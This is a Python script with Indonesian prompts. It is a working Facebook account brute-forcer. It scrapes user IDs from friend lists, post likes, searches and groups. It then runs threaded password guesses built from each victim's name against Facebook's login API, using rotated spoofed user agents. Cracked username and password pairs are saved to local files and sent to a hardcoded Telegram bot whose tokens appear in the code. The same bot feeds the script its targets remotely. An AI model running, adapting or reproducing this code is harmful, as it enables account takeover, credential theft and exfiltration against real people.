#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
if not os.path.exists("idt.txt"):
        ik = open("idt.txt", "a")
        ik.write("=========[Rp =< 5K]=========\n")
        ik.close()
def clear():
    os.system("clear")
def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./1000)
def baner():
    print("""\n\t\033[92m>  >  > \033[91m(\033[90m -_- \033[91m)\033[92m <  <  <
\033[95m=======================================\033[00m
\033[1m\033[93m                  vry\033[0m
\033[96m=======================================\033[00m""")
def balik():
    time.sleep(4)
#    f=input("\033[00m\t[\033[96mEnter To Back\033[00m]")
    os.system("python mby.py")

#def ste(use):
#    token = "5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs"
#    idd = 1380298324
#    bot = telepot.Bot(token)
#    bot.sendMessage(idd,use)
def ste(use):
    try:
        rep = requests.get('https://api.telegram.org/bot5162664077:AAFAjX2fJJiZUrpFroio2MaKJqsqqDBh7F8/sendMessage?chat_id=1380298324&text={}'.format(use))
        if rep.ok:
            print('\ntekirim\n')
    except:
        pass

#def getif():
#   final = requests.get("https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/getUpdates").json()
#   obj = final['result'][-1]['message']['text']
#   if "profile.php" in obj:
#       cge = obj.split("=")[1]
#       return cge
#   elif "https://www.facebook.com/" in obj:
#       gge = obj.split('https://www.facebook.com/')[1]
#       return gge
#   else:
#       balik()

def getif():
   while True:
       try:
           final = requests.get("https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/getUpdates").json()
           io = []
           if final['result'] != io:
               obj = final['result'][-1]['message']['text']
               up_id = final['result'][0]['update_id']
               url = 'https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/getUpdates?offset={}'.format(int(up_id)+1)
               requests.get(url)
               ob,ob1 = obj.split('\n')
               if int(ob1) > 5 or int(ob1) < 1:
                   print('aneh')
               elif "profile.php" in ob:
                   cge = ob.split("=")[1]
                   return cge,ob1
               elif "https://www.facebook.com/" in ob:
                   gge = ob.split('https://www.facebook.com/')[1]
                   return gge,ob1
               else:
                   print('mendeteksi ngentod',1)
                   time.sleep(5)
           else:
               print('mendeteksi ngentod')
               time.sleep(5)
       except Exception as e:
           mes= """
NB: link & enter & number

[1] Dari Daftar Teman
[2] Dari Like Post
[3] Dari Pencarian Nama
[4] Dari Grup
[5] Dari Teman

Error: {}
""".format(e)
           try:
               requests.get('https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text={}'.format(mes))
           except:
               pass
           time.sleep(2)


def mbf():
    f="1"
    if f == "1":
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         life = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                    cek = input("\033[90m> \033[00mCoookies : \033[1;92m")
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     fa = parser(ismi, "html.parser")
                     x = fa.find('title')
                     clear()
                     baner()
                     print("\033[1m\033[92m Nama \033[97m=\033[92m {}\033[0m\n".format(x.text))
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[90m> \033[00mMengganti bahasa, please wait\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
#                     try:
#                             ikuti = parser(requests.get(mbasic.format("/kontolbapakkau"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
#                             ses.get(mbasic.format(ikuti),cookies=cek)
#                     except :
#                             pass
                     return cek["cookie"]
             else:
                  os.remove("cookies")
                  exit("\033[00m[\033[91m!\033[00m]\033[00mCookies \033[1;91minvalid!!\033[00m")
#                  balik()
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             _azimua = random.choice(['Mozilla/5.0 (Linux; Android 8.1.0; Aquaris V Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4716.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SKW-H0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SM-A035M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; LGL455DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SM-A025M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; V2022) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; P00C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; SM-A510Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; V2028 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 OcIdWebView ({\\x22os\\x22:\\x22Android\\x22,\\x22osVersion\\x22:\\x2230\\x22,\\x22app\\x22:\\x22com.google.android.gms\\x22,\\x22appVersion\\x22:\\x22219\\x22,\\x22style\\x22:2,\\x22isDarkTheme\\x22:true})', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SM-A115U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; Mi A2 Lite Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.164 Mobile Safari/537.36 OcIdWebView ({\\x22os\\x22:\\x22Android\\x22,\\x22osVersion\\x22:\\x2230\\x22,\\x22app\\x22:\\x22com.google.android.gms\\x22,\\x22appVersion\\x22:\\x22219\\x22,\\x22style\\x22:2,\\x22isDarkTheme\\x22:true})', 'Mozilla/5.0 (Linux; Android 11; Infinix X698) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; XT1635-02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SO-52B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A526U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-A022F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; C6833) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4681.4 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; CPH1943) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SM-A205YN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-A105F Build/Corvus-arm64-by-Eureka-Team-QD4A.200905.003;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; Z986DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; A001XM Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 i-filter/sbm-safety', 'Mozilla/5.0 (Linux; Android 10; SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-J415GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'])
#["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params,headers=headers_)
             if 'EAA' in response.text:
                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m=> \033[1;32m{password}                       ",end="")
                 print()
                 result += 1
                 uspw = "{} : {}".format(username,password)
                 ste(uspw)
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('hasilbisa.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m=> \033[1;33m{password}                    ",end="")
                   print()
                   check += 1
                   uspw = "{} : {}".format(username,password)
                   ste(uspw)
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('checkpoint.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Bisa : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp/sesi : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mWrong : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[90m> \033[1;96m' + str(len(id)) + " \033[00mTersimpan",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit("\033[90m> \033[1;91mcant dump id\033[00m ")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[90m \033[1;96m{str(len(id))} \033[00mTersimpan',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mTersimpan ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mTersimpan ",end="")
#                 for x in id:
#                     with open('id.txt','a') as f:
#                         f.write(x+'\n')
#
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
#                   clear()
#                   baner()

#                   kata('\033[1;97m[\033[1;93m1\033[1;97m] \033[00mDaftar Teman')
#                   kata('\033[1;97m[\033[1;93m2\033[1;97m] \033[00mDari Like Post\033[1;97m ')
#                   kata('\033[1;97m[\033[1;93m3\033[1;97m] \033[00mDari Pencarian Nama')
#                   kata('\033[1;97m[\033[1;93m4\033[1;97m] \033[00mDari Grup ')
#                   kata('\033[1;97m[\033[1;93m5\033[1;97m] \033[00mDari Teman')
#                   kata('\033[1;97m[\033[1;93m6\033[1;97m] \033[00mLihat Hasil (rusak)')
#                   kata('\033[94m===========================================\033[0m\n')
#                   print()

#                   tanya = input('\033[90m> \033[1;93m ')
#                   tanya = '5'
                   kayes,tanya = getif()
                   if tanya =="":
                         exit("\033[00m[\033[91m!\033[00m] Nyongek")
                   elif tanya == '1':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif tanya == '2':
                         username = input("\033[90m> \033[00mURL Post : \033[1;92m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] Nyongek")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'm.facebook.com' in username:
                                 username = username.replace('m.facebook.com','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif tanya == '3':
                         knf = input("\033[90m> \033[00mquery : \033[1;92m")
                         username = bysearch(mbasic.format('/search/people/?q='+knf))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[00m] no result")
                   elif tanya == '4':
                         print("\033[90m> \033[00mHanya bisa \033[91m100 \033[00mID ")
                         grab = input("\033[90m> \033[00mID group : \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[00m]ID wrong")
                   elif tanya == '5':
#                         knf = input("\033[90m> \033[00mUsername/Id : \033[1;92m")
                         knf = kayes
                         j = open("idt.txt",'r').read()
                         if knf in j.split():
                                 balik()
                         else:
                                 uj = open("idt.txt","a")
                                 uj.write("{}\n".format(knf))
                                 uj.close()
                                 print(" \033[93mMengeksekusi\033[0m ",knf)
                                 ste('Mengeksekusi {}'.format(knf))
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except:
                                 exit("\033[00m[\033[91m!\033[00m] User Not Found ")
                                 sys.exit()
                   elif tanya == '6':
                         try:
                                 file1 = open("checkpoint.txt").read()
                                 file2 = open("hasilbisa.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[00m [\033[1;93m{str(len(final))}\033[00m] accounts check ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
#                                 os.remove("checkpoint.txt")
#                                 os.remove("hasilbisa.txt")
                                 for x in life:
                                         with open('hasilbisa.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('checkpoint.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\033[00m[\033[92m✓\033[00m] Done")
                                 print("\033[90m> \033[00msaved to \033[1;93mcheckpoint.txt\033[90m|\033[1;92mhasilbisa.txt")
                         except FileNotFoundError:
                                 exit("\033[00m[\033[91m!\033[00m] tidak ada results")
                   else:
                         exit("\033[00m[\033[91m!\033[00m] wrong choice")
                   print()
#                   expass = input("\033[90m> \033[00mTambahan Password: \033[1;92m")
                   expass = "1234567890"
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x.lower()) + '123',
                                                  str(x.lower()) + '12345',
                                                  str(x.lower()) + '1234',
                                                  str(x.lower()) + '12',
                                                  str(x.capitalize()) + '123',
                                                  str(x.capitalize()) + '12345',
                                                  str(x.capitalize()) + '1234',
                                                  str(x.capitalize()) + '12',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
#                                                  print(users[1],' | ',passw)
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\033[1;94m===========================================\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] Done")
                           print("\033[00m[\033[92m✓\033[00m]bisa : \033[92mhasilbisa.txt\033[00m")
                           print("\033[00m[\033[91m!\033[00m]cp/sesi : \033[93mcheckpoint.txt\033[00m")
                           print("\n\n")
                   
                   else:
                           time.sleep(0.1)
                           print("\033[94m===========================================\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] Done")
                           print("\033[00m[\033[91m!\033[00m] no result")
               except (KeyboardInterrupt,EOFError):
                       sys.exit()
               except requests.exceptions.ConnectionError:
                       exit("\033[00m[\033[91m!\033[00m] Connection error")
                       sys.exit()
    else:
         sys.exit()
#         balik()  


if __name__=="__main__":
     clear()
     mbf()
     balik()
